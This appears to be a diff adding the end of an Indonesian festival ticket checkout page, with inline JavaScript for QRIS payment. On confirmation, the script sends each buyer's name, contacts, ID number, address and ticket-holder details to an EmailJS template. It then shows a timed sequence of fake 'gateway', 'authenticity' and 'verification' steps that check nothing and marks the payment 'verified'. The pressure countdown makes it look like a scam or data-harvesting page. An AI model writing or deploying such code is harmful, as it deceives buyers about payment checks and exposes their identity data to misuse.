+<span class="artatix-footer-icon" aria-hidden="true"><svg viewBox="0 0 24 24"><path d="M20.5 3.5A11.9 11.9 0 0 0 12.05 0C5.47 0 .12 5.35.12 11.93c0 2.1.55 4.15 1.59 5.96L.02 24l6.25-1.64a11.86 11.86 0 0 0 5.78 1.49h.01c6.58 0 11.93-5.35 11.93-11.93 0-3.19-1.24-6.19-3.49-8.42ZM12.06 21.8h-.01a9.84 9.84 0 0 1-5.02-1.37l-.36-.21-3.71.97.99-3.62-.23-.37a9.88 9.88 0 1 1 8.34 4.6Zm5.42-7.4c-.3-.15-1.77-.87-2.04-.97-.27-.1-.47-.15-.67.15-.2.3-.77.97-.94 1.17-.17.2-.35.22-.65.07-.3-.15-1.24-.46-2.36-1.46-.87-.78-1.46-1.74-1.63-2.04-.17-.3-.02-.46.13-.61.14-.14.3-.35.45-.52.15-.17.2-.3.3-.5.1-.2.05-.37-.02-.52-.07-.15-.67-1.62-.92-2.22-.24-.58-.49-.5-.67-.51h-.57c-.2 0-.52.07-.79.37-.27.3-1.04 1.02-1.04 2.49s1.07 2.89 1.22 3.09c.15.2 2.1 3.21 5.08 4.5.71.31 1.26.49 1.69.63.71.23 1.36.2 1.87.12.57-.09 1.77-.72 2.02-1.42.25-.7.25-1.3.17-1.42-.07-.12-.27-.2-.57-.35Z"/></svg></span>
+<span>+62 821-3767-6220</span>
+</a>
+<a class="artatix-footer-contact" href="mailto:cs@artatix.co.id" aria-label="Email Artatix">
+<span class="artatix-footer-icon mail" aria-hidden="true"><svg viewBox="0 0 24 24"><path d="M20 4H4a2 2 0 0 0-2 2v12a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2Zm0 4.2-8 5.33L4 8.2V6l8 5.33L20 6v2.2Z"/></svg></span>
+<span>cs@artatix.co.id</span>
+</a>
+</div>
+<div class="artatix-footer-divider" aria-hidden="true"></div>
+<p class="artatix-footer-copy">© 2026 Artatix. Hak Cipta Dilindungi.</p>
+</div>
+</footer>
+</div>
+<div class="premium-payment-loading" id="loading" aria-hidden="true">
+<div class="premium-loading-bg" aria-hidden="true"><span></span><span></span><span></span></div>
+<div class="premium-loading-card">
+<img src="logo-artatix.png" alt="Artatix" class="premium-loading-logo" width="235" height="54">
+<div class="premium-loader-ring" aria-hidden="true"><span></span></div>
+<div class="premium-loading-title" id="processingTitle" role="status">Menghubungkan ke Gateway</div>
+<div class="premium-loading-subtitle" id="processingSubtitle">Membangun koneksi aman terenkripsi ke server pembayaran</div>
+<div class="premium-loading-progress"><span id="processingProgress"></span></div>
+<div class="premium-loading-time"><strong id="processingCountdown">03:00</strong><span class="premium-loading-pct" id="processingPercent">0%</span></div>
+<p class="premium-loading-note">Mohon jangan tutup atau muat ulang halaman ini</p>
+<div class="premium-loading-order">ORDER <b id="processingOrderId">-</b></div>
+</div>
+</div>
+<div class="toast" id="toast" role="status" aria-live="polite"></div>
+<script>
+(() => {
+'use strict';
+const EVENT_TITLE = 'TITIK BALIK FESTIVAL 2027';
+const KEY = { order: 'gf_order_v1', orderId: 'gf_order_id', payment: 'gf_payment_v1', deadline: 'gf_payment_deadline' };
+const PROCESS_KEY = 'gf_payment_processing_v1';
+const EMAILJS = {
+url: 'https://api.emailjs.com/api/v1.0/email/send',
+serviceId: 'service_ynugzqh',
+templateId: 'template_2vruur5',
+publicKey: 'NSIn5d3O1_8JmCvEz',
+timeoutMs: 8000
+};
+const MAX_SIZE = 8 * 1024 * 1024;
+const TYPES = ['image/jpeg', 'image/png', 'image/webp'];
+const PAY_WINDOW_S = 180;
+const PROCESS_MS = 180000;
+const BASE_TITLE = 'Pembayaran QRIS | Artatix';
+const reduceMotion = Boolean(window.matchMedia && window.matchMedia('(prefers-reduced-motion: reduce)').matches);
+const PHASES = [
+['Menghubungkan ke Gateway', 'Membangun koneksi aman terenkripsi ke server pembayaran'],
+['Mengunggah Bukti Bayar', 'Bukti pembayaranmu sedang dikirim dengan aman'],
+['Memverifikasi Bukti', 'Sistem memeriksa kejelasan bukti transfer'],
+['Mencocokkan Nominal', 'Memastikan nominal sesuai dengan total pesanan'],
+['Memeriksa Keaslian', 'Validasi transaksi QRIS sedang berlangsung'],
+['Mengunci Kuota Tiket', 'Tiketmu dicadangkan khusus untukmu'],
+['Menerbitkan E-Ticket', 'Tiket digitalmu sedang disiapkan'],
+['Menyimpan Data Pesanan', 'Detail pemesanan direkap ke sistem'],
+['Verifikasi Akhir', 'Pemeriksaan terakhir sebelum tiket dilepas'],
+['Hampir Selesai', 'E-ticket akan terbuka otomatis sebentar lagi']
+];
+const $ = id => document.getElementById(id);
+const nf = new Intl.NumberFormat('id-ID');
+const fmt = n => 'Rp' + nf.format(Math.round(n));
+const formatTime = seconds => {
+const safe = Math.max(0, Math.ceil(seconds));
+const m = Math.floor(safe / 60), s = safe % 60;
+return (m < 10 ? '0' : '') + m + ':' + (s < 10 ? '0' : '') + s;
+};
+let order = null;
+try { order = JSON.parse(localStorage.getItem(KEY.order) || 'null'); } catch (e) {}
+if (!order || !order.cart || !Array.isArray(order.cart.items) || !order.cart.items.length) {
+try { localStorage.removeItem(KEY.deadline); } catch (e) {}
+location.replace('tiket.html');
+return;
+}
+const items = order.cart.items;
+const totalQty = order.cart.totalQty || items.reduce((a, i) => a + (i.qty || 0), 0);
+const totalPrice = order.cart.totalPrice || items.reduce((a, i) => a + (i.harga || 0) * (i.qty || 0), 0);
+const orderId = localStorage.getItem(KEY.orderId) || 'GF-' + Date.now().toString(36).toUpperCase();
+try { localStorage.setItem(KEY.orderId, orderId); } catch (e) {}
+const fileInput = $('file'), drop = $('drop'), btn = $('btn');
+const preview = $('preview'), previewImg = $('previewImg'), fileName = $('fileName');
+const removeBtn = $('removeFile'), loading = $('loading'), toast = $('toast');
+const timerEl = $('timer'), timerBox = $('timerBox'), hint = $('btnHint');
+const processingProgress = $('processingProgress');
+const processingCountdown = $('processingCountdown');
+const processingPercent = $('processingPercent');
+const processingOrderId = $('processingOrderId');
+const processingTitle = $('processingTitle');
+const processingSubtitle = $('processingSubtitle');
+let receipt = null, objectUrl = null;
+let remaining = PAY_WINDOW_S, deadline = 0, interval = null;
+let warned = false, expired = false, toastTimer = null;
+let processingTimer = null, processingStarted = 0, processingEnd = 0, processingActive = false, lastPct = -1;
+ $('orderId').textContent = orderId;
+ $('orderChipId').textContent = orderId;
+ $('namaPemesan').textContent = order.nama || '-';
+ $('jenisTiket').textContent = items.map(i => i.jenis + ' (x' + i.qty + ')').join(', ');
+ $('jumlahTiket').textContent = totalQty;
+const countUp = (elm, target) => {
+if (reduceMotion) { elm.textContent = fmt(target); return; }
+const t0 = performance.now(), dur = 700;
+const step = now => {
+const p = Math.min(1, (now - t0) / dur), e = 1 - Math.pow(1 - p, 3);
+elm.textContent = fmt(Math.round(target * e));
+if (p < 1) requestAnimationFrame(step); else elm.textContent = fmt(target);
+};
+requestAnimationFrame(step);
+};
+countUp($('total'), totalPrice);
+countUp($('totalQr'), totalPrice);
+const notify = msg => {
+toast.textContent = msg;
+toast.classList.add('show');
+clearTimeout(toastTimer);
+toastTimer = setTimeout(() => toast.classList.remove('show'), 2600);
+};
+let copiedTimer = null;
+const flash = elm => {
+elm.classList.add('copied');
+clearTimeout(copiedTimer);
+copiedTimer = setTimeout(() => elm.classList.remove('copied'), 1400);
+};
+const copyFallback = text => {
+const ta = document.createElement('textarea');
+ta.value = text;
+ta.setAttribute('readonly', '');
+ta.style.cssText = 'position:fixed;opacity:0;pointer-events:none';
+document.body.appendChild(ta);
+ta.select();
+const ok = document.execCommand('copy');
+ta.remove();
+return ok;
+};
+const copyValue = async (text, label, btnEl) => {
+let ok = false;
+try {
+if (navigator.clipboard && window.isSecureContext) { await navigator.clipboard.writeText(text); ok = true; }
+} catch (e) {}
+if (!ok) { try { ok = copyFallback(text); } catch (e) { ok = false; } }
+if (ok) { notify(label + ' berhasil disalin'); if (btnEl) flash(btnEl); }
+else notify('Gagal menyalin ' + label.toLowerCase());
+return ok;
+};
+const copyTotalBtn = $('copyTotal'), copyTotalLabel = $('copyTotalLabel');
+let totalCopyTimer = null;
+copyTotalBtn.addEventListener('click', async () => {
+const ok = await copyValue(String(totalPrice), 'Nominal', copyTotalBtn);
+copyTotalLabel.textContent = ok ? '✓ Tersalin' : 'Gagal disalin';
+clearTimeout(totalCopyTimer);
+totalCopyTimer = setTimeout(() => { copyTotalLabel.textContent = 'Salin Nominal'; }, 1500);
+});
+ $('copyOrder').addEventListener('click', () => copyValue(orderId, 'Order ID', $('copyOrder')));
+const render = () => {
+timerEl.textContent = formatTime(remaining);
+document.title = timerEl.textContent + ' • ' + BASE_TITLE;
+};
+const stopTimer = () => { clearInterval(interval); interval = null; };
+const clearStoredDeadline = () => { try { localStorage.removeItem(KEY.deadline); } catch (e) {} };
+const update = () => {
+btn.disabled = expired || processingActive || !receipt;
+hint.textContent = btn.disabled
+? (expired ? 'Waktu pembayaran telah habis' : 'Unggah bukti pembayaran untuk mengaktifkan tombol konfirmasi')
+: 'Bukti pembayaran siap — konfirmasi pembayaranmu sekarang';
+hint.classList.toggle('ok', !btn.disabled);
+};
+const expire = () => {
+if (expired || processingActive) return;
+expired = true;
+stopTimer();
+update();
+clearStoredDeadline();
+document.title = BASE_TITLE;
+notify('Waktu pembayaran habis. Kembali ke halaman utama...');
+setTimeout(() => {
+document.body.classList.add('leaving');
+setTimeout(() => location.replace('index.html'), 280);
+}, 1800);
+};
+const tick = () => {
+remaining = Math.max(0, Math.round((deadline - Date.now()) / 1000));
+if (!warned && remaining <= 60 && remaining > 0) {
+warned = true;
+notify('Sisa waktu pembayaran kurang dari 1 menit. Segera selesaikan transaksi.');
+}
+if (remaining <= 30 && remaining > 0) timerBox.classList.add('urgent');
+render();
+if (remaining <= 0) { stopTimer(); expire(); }
+};
+const startTimer = () => { if (!interval) interval = setInterval(tick, 1000); };
+try {
+const saved = Number(localStorage.getItem(KEY.deadline));
+const now = Date.now();
+deadline = Number.isFinite(saved) && saved > now && saved - now <= PAY_WINDOW_S * 1000 + 2000 ? saved : 0;
+} catch (e) { deadline = 0; }
+if (!deadline) {
+deadline = Date.now() + PAY_WINDOW_S * 1000;
+try { localStorage.setItem(KEY.deadline, String(deadline)); } catch (e) {}
+}
+remaining = Math.max(0, Math.round((deadline - Date.now()) / 1000));
+render();
+startTimer();
+const clearPreview = () => {
+receipt = null;
+if (objectUrl) { URL.revokeObjectURL(objectUrl); objectUrl = null; }
+previewImg.removeAttribute('src');
+fileName.textContent = '';
+preview.hidden = true;
+update();
+};
+const setFile = file => {
+if (!file) { fileInput.value = ''; clearPreview(); return; }
+if (!TYPES.includes(file.type) || file.size > MAX_SIZE) {
+fileInput.value = '';
+clearPreview();
+notify('Bukti pembayaran harus JPG, JPEG, PNG, atau WebP maksimal 8 MB.');
+return;
+}
+receipt = { name: file.name, size: file.size, type: file.type, selectedAt: new Date().toISOString() };
+if (objectUrl) URL.revokeObjectURL(objectUrl);
+objectUrl = URL.createObjectURL(file);
+previewImg.src = objectUrl;
+fileName.textContent = file.name + ' • ' + Math.ceil(file.size / 1024) + ' KB';
+preview.hidden = false;
+try {
+const dt = new DataTransfer();
+dt.items.add(file);
+fileInput.files = dt.files;
+} catch (e) {}
+update();
+notify('Bukti berhasil diunggah — tombol konfirmasi aktif.');
+};
+fileInput.addEventListener('change', event => setFile(event.target.files && event.target.files[0]));
+fileInput.addEventListener('focus', () => drop.classList.add('kb-focus'));
+fileInput.addEventListener('blur', () => drop.classList.remove('kb-focus'));
+removeBtn.addEventListener('click', () => { fileInput.value = ''; clearPreview(); notify('Bukti pembayaran dihapus.'); });
+['dragenter', 'dragover'].forEach(name => drop.addEventListener(name, event => { event.preventDefault(); drop.classList.add('drag'); }));
+drop.addEventListener('dragleave', () => drop.classList.remove('drag'));
+drop.addEventListener('drop', event => {
+event.preventDefault();
+drop.classList.remove('drag');
+const file = event.dataTransfer && event.dataTransfer.files && event.dataTransfer.files[0];
+if (file) setFile(file);
+});
+window.addEventListener('dragover', event => event.preventDefault());
+window.addEventListener('drop', event => event.preventDefault());
+update();
+const timeoutFetch = (url, options, ms) => {
+const ctrl = new AbortController();
+const timer = setTimeout(() => ctrl.abort(), ms);
+return fetch(url, Object.assign({}, options, { signal: ctrl.signal })).finally(() => clearTimeout(timer));
+};
+const buildHoldersText = () => {
+const list = Array.isArray(order.holders) ? order.holders : [];
+return list.map(h =>
+'#' + h.number + '  ' + (h.ticketName || '-') + '\n' +
+'     Nama    : ' + (h.nama || '-') + '\n' +
+'     E-mail  : ' + (h.email || '-') + '\n' +
+'     WA      : ' + (h.wa || '-')
+).join('\n\n') || '-';
+};
+const updateProcessRecord = patch => {
+try {
+const rec = JSON.parse(localStorage.getItem(PROCESS_KEY) || 'null');
+if (rec && rec.orderId === orderId) localStorage.setItem(PROCESS_KEY, JSON.stringify(Object.assign(rec, patch)));
+} catch (e) {}
+};
+const sendEmailJS = () => {
+const waDigits = String(order.wa || '').replace(/[\s-]/g, '');
+return timeoutFetch(EMAILJS.url, {
+method: 'POST',
+headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
+body: JSON.stringify({
+service_id: EMAILJS.serviceId,
+template_id: EMAILJS.templateId,
+user_id: EMAILJS.publicKey,
+template_params: {
+event: EVENT_TITLE,
+order_id: orderId,
+status: 'Menunggu Verifikasi Pembayaran',
+nama: order.nama || '-',
+email: order.email || '-',
+whatsapp: order.wa || '-',
+whatsapp_link: /^(?:\+?62|0)8\d{7,12}$/.test(waDigits) ? waDigits.replace(/^(?:\+?62|0)/, '62') : '',
+identitas_jenis: order.identitas || '-',
+identitas_nomor: order.nomorId || '-',
+alamat: order.alamat || '-',
+jenis_tiket: items.map(i => i.jenis + ' (x' + i.qty + ')').join(', '),
+jumlah_tiket: String(totalQty),
+total: fmt(totalPrice),
+receipt_name: receipt ? receipt.name : '-',
+receipt_size: receipt ? Math.ceil(receipt.size / 1024) + ' KB' : '-',
+receipt_type: receipt ? receipt.type : '-',
+pemegang_tiket: buildHoldersText(),
+submitted_at: new Date().toLocaleString('id-ID', { dateStyle: 'full', timeStyle: 'medium' }),
+reply_to: order.email || ''
+}
+})
+}, EMAILJS.timeoutMs).then(
+r => { updateProcessRecord({ emailStatus: r && r.ok ? 'sent' : 'failed' }); },
+() => { updateProcessRecord({ emailStatus: 'failed' }); }
+);
+};
+const swapText = (el, txt) => {
+if (el.textContent === txt) return;
+el.textContent = txt;
+el.classList.remove('swap');
+void el.offsetWidth;
+el.classList.add('swap');
+};
+const clearProcessing = () => {
+clearInterval(processingTimer);
+processingTimer = null;
+processingActive = false;
+document.body.classList.remove('lock');
+loading.classList.remove('active');
+loading.setAttribute('aria-hidden', 'true');
+try { localStorage.removeItem(PROCESS_KEY); } catch (e) {}
+};
+const finishProcessing = () => {
+clearProcessing();
+clearStoredDeadline();
+try {
+localStorage.setItem(KEY.payment, JSON.stringify({
+orderId: orderId,
+status: 'verified',
+total: totalPrice,
+receipt: receipt,
+submittedAt: new Date(processingStarted).toISOString(),
+completedAt: new Date().toISOString()
+}));
+} catch (e) {}
+document.body.classList.add('leaving');
+setTimeout(() => location.replace('success.html'), 300);
+};
+const renderProcessing = () => {
+const now = Date.now();
+const remainingMs = Math.max(0, processingEnd - now);
+const elapsed = Math.min(PROCESS_MS, Math.max(0, now - processingStarted));
+const pct = Math.min(100, Math.round((elapsed / PROCESS_MS) * 100));
+processingCountdown.textContent = formatTime(remainingMs / 1000);
+processingPercent.textContent = pct + '%';
+processingProgress.style.width = pct + '%';
+loading.classList.toggle('final-countdown', remainingMs <= 10000 && remainingMs > 0);
+const phase = PHASES[Math.min(PHASES.length - 1, Math.floor(elapsed / (PROCESS_MS / PHASES.length)))];
+swapText(processingTitle, phase[0]);
+swapText(processingSubtitle, phase[1]);
+if (lastPct !== pct) { lastPct = pct; document.title = 'Memproses ' + pct + '% • ' + BASE_TITLE; }
+if (remainingMs <= 0) finishProcessing();
+};
+const beginProcessing = (startedAt, endAt) => {
+stopTimer();
+processingStarted = Number(startedAt) || Date.now();
+processingEnd = Number(endAt) || processingStarted + PROCESS_MS;
+processingActive = true;
+btn.disabled = true;
+document.body.classList.add('lock');
+loading.classList.add('active');
+loading.setAttribute('aria-hidden', 'false');
+lastPct = -1;
+processingOrderId.textContent = orderId;
+processingTitle.textContent = '';
+processingSubtitle.textContent = '';
+clearInterval(processingTimer);
+renderProcessing();
+processingTimer = setInterval(renderProcessing, 250);
+};
+const resumeProcessingIfNeeded = () => {
+let saved = null;
+try { saved = JSON.parse(localStorage.getItem(PROCESS_KEY) || 'null'); } catch (e) {}
+if (!saved || saved.orderId !== orderId || !saved.endsAt) return false;
+try {
+const prev = JSON.parse(localStorage.getItem(KEY.payment) || 'null');
+if (!receipt && prev && prev.receipt) receipt = prev.receipt;
+} catch (e) {}
+if (saved.emailStatus !== 'sent') sendEmailJS().catch(() => {});
+if (Number(saved.endsAt) <= Date.now()) { finishProcessing(); return true; }
+beginProcessing(saved.startedAt, saved.endsAt);
+return true;
+};
+btn.addEventListener('click', () => {
+if (btn.disabled || expired || processingActive) return;
+stopTimer();
+const startedAt = Date.now();
+const endsAt = startedAt + PROCESS_MS;
+try {
+localStorage.setItem(PROCESS_KEY, JSON.stringify({ orderId: orderId, startedAt: startedAt, endsAt: endsAt, submittedAt: new Date(startedAt).toISOString(), emailStatus: 'pending' }));
+localStorage.setItem(KEY.payment, JSON.stringify({ orderId: orderId, submittedAt: new Date(startedAt).toISOString(), receipt: receipt }));
+} catch (e) {}
+beginProcessing(startedAt, endsAt);
+sendEmailJS().catch(() => {});
+});
+resumeProcessingIfNeeded();
+window.addEventListener('pageshow', event => {
+if (event.persisted && !processingActive) {
+document.body.classList.remove('lock');
+loading.classList.remove('active');
+loading.setAttribute('aria-hidden', 'true');
+update();
+tick();
+if (!expired && remaining > 0) startTimer();
+}
+});
+window.addEventListener('beforeunload', event => {
+if (processingActive) { event.preventDefault(); event.returnValue = ''; }
+});
+})();
+</script>
+</body>
+</html>
